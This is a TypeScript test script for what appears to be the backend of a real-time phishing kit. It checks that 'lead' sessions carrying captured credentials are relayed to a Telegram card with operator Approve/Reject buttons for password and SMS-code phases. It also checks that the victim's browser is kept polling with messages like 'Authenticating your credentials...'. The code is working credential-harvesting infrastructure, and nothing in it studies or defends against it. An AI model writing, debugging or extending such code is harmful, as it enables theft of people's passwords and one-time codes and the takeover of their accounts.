/**
 * Checks the browser-facing lead endpoint and the Telegram card persistence
 * path against the configured Redis.
 *
 * Run with `npm run check:api`. Writes one session key under a random UUID and
 * deletes it again. The Bot API is stubbed, so nothing is sent to Telegram.
 */
import "dotenv/config";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import type { AddressInfo } from "node:net";
import { InlineKeyboard } from "grammy";
import app from "../server/app.js";
import { redis } from "../server/clients/upstash.client.js";
import { bot } from "../server/clients/grammy.client.js";
import {
  readLeadSession,
  restartLeadSession,
  updateLeadSession,
} from "../server/methods/lead.methods.js";
import { sendSessionToTelegram } from "../server/methods/session.methods.js";

type ApiCall = { kind: "send" | "edit"; text: string; markup: unknown };
const apiCalls: ApiCall[] = [];
const api = bot.api as unknown as Record<string, unknown>;
api.sendMessage = async (
  _chatId: string,
  text: string,
  other?: { reply_markup?: unknown },
) => {
  apiCalls.push({ kind: "send", text, markup: other?.reply_markup ?? null });
  return { message_id: 99 };
};
api.editMessageText = async (
  _chatId: string,
  _messageId: number,
  text: string,
  other?: { reply_markup?: unknown },
) => {
  apiCalls.push({ kind: "edit", text, markup: other?.reply_markup ?? null });
  return true;
};
api.deleteMessage = async () => true;

const sessionId = randomUUID();
const server = app.listen(0);
await new Promise<void>((resolve) => server.once("listening", () => resolve()));
const { port } = server.address() as AddressInfo;
const base = `http://127.0.0.1:${port}`;

try {
  const authKeyboard = new InlineKeyboard()
    .text("Reject", `lr:${sessionId}:auth-flag`)
    .text("Approve", `lr:${sessionId}:auth-pass`);

  const created = await restartLeadSession(sessionId, { status: "loading" });
  const first = await sendSessionToTelegram(
    { ...created, credentials: "Password - hunter2", logs: "log line" },
    { inlineKeyboard: authKeyboard },
  );
  assert.equal(first.messageId, 99);
  assert.equal(apiCalls.at(-1)?.kind, "send");
  assert.match(apiCalls.at(-1)!.text, /Password - hunter2/);
  assert.deepEqual(first.keyboard, {
    inline_keyboard: authKeyboard.inline_keyboard,
  });
  assert.deepEqual(apiCalls.at(-1)!.markup, first.keyboard);

  await updateLeadSession(sessionId, {
    ...first,
    process: "auth",
    feedback: "Authenticating your credentials...",
  });

  // The browser polls /api/leads/:anchor — the handler used to read
  // params.sessionId, which is always undefined for this route.
  const live = await fetch(`${base}/api/leads/${sessionId}`);
  assert.equal(live.status, 202);
  const snapshot = (await live.json()) as Record<string, unknown>;
  assert.deepEqual(snapshot, {
    anchor: sessionId,
    status: "loading",
    process: "auth",
    message: "Authenticating your credentials...",
  });
  // Neither the credentials nor the stored buttons belong in a poll response.
  assert.equal("credentials" in snapshot, false);
  assert.equal("keyboard" in snapshot, false);

  const stored = await readLeadSession(sessionId);
  assert.ok(stored);
  assert.deepEqual(stored.keyboard, first.keyboard);

  // An edit that supplies no keyboard must re-send the stored one, so the
  // buttons survive every update.
  const second = await sendSessionToTelegram(
    { ...stored, messageId: 99 },
    { text: "phase two" },
  );
  const editCall = apiCalls.at(-1)!;
  assert.equal(editCall.kind, "edit");
  assert.equal(editCall.text, "phase two");
  assert.deepEqual(editCall.markup, first.keyboard);
  assert.deepEqual(second.keyboard, first.keyboard);

  // A fresh keyboard replaces the stored one.
  const codeKeyboard = new InlineKeyboard()
    .text("Reject", `lr:${sessionId}:v-sms-code-flag`)
    .text("Approve", `lr:${sessionId}:v-sms-code-pass`);
  const third = await sendSessionToTelegram(
    { ...stored, messageId: 99 },
    { text: "code phase", inlineKeyboard: codeKeyboard },
  );
  assert.deepEqual(third.keyboard, {
    inline_keyboard: codeKeyboard.inline_keyboard,
  });
  await updateLeadSession(sessionId, third);

  // keepMessageId keeps the card *and* its buttons; a full restart drops both.
  const kept = await restartLeadSession(sessionId, {
    status: "loading",
    keepMessageId: true,
  });
  assert.equal(kept.messageId, 99);
  assert.deepEqual(kept.keyboard, third.keyboard);
  const reset = await restartLeadSession(sessionId, { status: "idle" });
  assert.equal(reset.messageId, undefined);
  assert.equal(reset.keyboard, undefined);

  // Deleting a card forgets both its id and its buttons.
  await updateLeadSession(sessionId, third);
  await updateLeadSession(sessionId, { messageId: null, keyboard: null });
  const cleared = await readLeadSession(sessionId);
  assert.equal(cleared?.messageId, undefined);
  assert.equal(cleared?.keyboard, undefined);

  // Unknown sessions terminate the poll instead of spinning forever.
  const missingId = randomUUID();
  const missing = await fetch(`${base}/api/leads/${missingId}`);
  assert.equal(missing.status, 202);
  const expired = (await missing.json()) as Record<string, unknown>;
  assert.equal(expired.status, "failed");
  assert.equal(expired.anchor, missingId);
  assert.equal(await redis.get(`lead-session:${missingId}`), null);

  const notFound = await fetch(`${base}/api/nope`);
  assert.equal(notFound.status, 404);

  console.log(
    "ok: session snapshot, stored keyboard reuse/replacement and restart behaviour hold",
  );
} finally {
  await new Promise<void>((resolve) => server.close(() => resolve()));
  await redis.del(`lead-session:${sessionId}`);
  console.log("cleaned up", sessionId);
}
